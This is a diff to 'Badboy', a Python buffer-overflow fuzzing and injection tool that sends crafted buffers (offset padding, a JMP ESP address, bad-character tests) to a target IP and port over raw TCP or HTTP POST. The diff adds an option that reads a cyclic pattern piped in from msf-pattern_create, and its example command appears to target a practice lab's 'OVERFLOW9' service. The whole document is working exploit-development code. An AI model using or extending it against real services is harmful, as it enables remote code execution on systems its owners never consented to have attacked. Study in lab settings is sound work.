@@ -3,6 +3,7 @@
 import requests
 import argparse
 import socket
+import sys
 import time
 import binascii
 
@@ -13,6 +14,7 @@ def parseArgs():
   args.add_argument('-b', default=None, help="Bad Chars to exclude, during testing phase")
   args.add_argument('-eip', default=None, help="Jump ESP address")
   args.add_argument('-off', type=int, default=None, help="Offset or Overflow size (# of 'A')")
+  args.add_argument('--cpattern', type=int, default=0, help="Specify if a cyclic pattern is supplied from STDIN (Piped into the program) 1 = true, 0 = false \n e.g : msf-pattern_create -l 1600 | python3 Badboy.py --mode inject -c raw-tcp 10.10.112.205 1337 \"OVERFLOW9\" --cpattern 1")
   args.add_argument('IP', help="IP Address of the target to fuzz on")
   args.add_argument('Port', type=int, help="Port of the target service to fuzz on")
   args.add_argument('Prefix', type=str, help="Prefix to use before the overflow, it could be a command or POST parameters")
@@ -72,8 +74,12 @@ class Buffer:
           if bytes(badC,encoding='latin-1') not in badCharBytes:
             self.__badchars += badC
 
-    def __init__(self, prefix, off, eip, badChars=""):
+    def __init__(self, prefix, cPattern, off, eip, badChars=""):
       self.__prefix = prefix
+      if cPattern == 1:
+        self.__bufferOffset = sys.stdin.read().strip()
+        self.__overflowSize = 1
+        self.__bufferOverflow = '' * self.__overflowSize
       if off != None:  
         self.__overflowSize = off
         self.__bufferOverflow = 'A' * self.__overflowSize
@@ -149,7 +155,6 @@ class Connector:
       if self.__connectionType[0] == self.__connection:
         requests.post(self.__targetURL,data=buffer, headers=self.__headers)
       elif self.__connectionType[1] == self.__connection:
-        
         self.__sock.send(buffer)
         self.__sock.recv(1024)
     except:
@@ -173,15 +178,15 @@ class Connector:
     return
 
 class Badboy:
-  __requestLatency = 5 # Time in second before sending another request  
+  __requestLatency = 3 # Time in second before sending another request  
   __modeType = ['fuzz', 'inject']
   __mode = ""
   __connector = object
   __buffer = object
   
-  def __init__(self, connector, mode, prefix, off=None, eip=None, badChars=None):
+  def __init__(self, connector, mode, prefix, cPattern=0, off=None, eip=None, badChars=None):
       self.__connector = connector
-      self.__buffer = Buffer(prefix, off, eip, badChars)
+      self.__buffer = Buffer(prefix, cPattern, off, eip, badChars)
       self.__mode = checkValidOption(mode, self.__modeType, 'mode')
       return
   
@@ -215,7 +220,7 @@ class Badboy:
 def main():
   args = parseArgs()
   connector = Connector(args.c,args.IP,args.Port)
-  fuzzer = Badboy(connector, args.mode, args.Prefix, args.off, args.eip, args.b)
+  fuzzer = Badboy(connector, args.mode, args.Prefix, args.cpattern, args.off, args.eip, args.b)
   print ("[+] Starting Badboy in {0} mode".format(fuzzer.getMode()))
   fuzzer.start() 
   return
